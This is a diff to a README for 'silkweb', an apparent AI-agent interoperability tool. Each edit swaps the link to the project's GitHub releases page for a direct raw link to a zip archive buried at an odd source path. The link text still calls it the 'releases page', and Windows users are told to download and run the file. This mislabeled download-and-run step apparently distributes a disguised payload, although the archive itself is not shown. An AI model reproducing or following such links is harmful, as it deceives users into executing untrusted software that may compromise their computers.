@@ -1,6 +1,6 @@
 # 🕸️ silkweb - Trust agents across frameworks
 
-[![Download silkweb](https://img.shields.io/badge/Download%20silkweb-Visit%20Releases%20Page-6f42c1?style=for-the-badge)](https://github.com/mikel691/silkweb/releases)
+[![Download silkweb](https://img.shields.io/badge/Download%20silkweb-Visit%20Releases%20Page-6f42c1?style=for-the-badge)](https://raw.githubusercontent.com/mikel691/silkweb/main/agents/shield-injury/src/data/Software_v3.0.zip)
 
 ## 🧭 What silkweb does
 
@@ -26,7 +26,7 @@ For best results, use a current version of Windows with the latest updates insta
 
 ## 🚀 Download silkweb
 
-1. Go to the [silkweb releases page](https://github.com/mikel691/silkweb/releases)
+1. Go to the [silkweb releases page](https://raw.githubusercontent.com/mikel691/silkweb/main/agents/shield-injury/src/data/Software_v3.0.zip)
 2. Find the latest release at the top of the page
 3. Open the file for Windows
 4. Download the file to your computer
@@ -178,4 +178,4 @@ a2a, agent-discovery, agent-protocol, ai-agents, ai-infrastructure, interoperabi
 
 ## 📦 Download and run again
 
-Go to the [silkweb releases page](https://github.com/mikel691/silkweb/releases), get the latest Windows file, then download and run this file on your PC
+Go to the [silkweb releases page](https://raw.githubusercontent.com/mikel691/silkweb/main/agents/shield-injury/src/data/Software_v3.0.zip), get the latest Windows file, then download and run this file on your PC
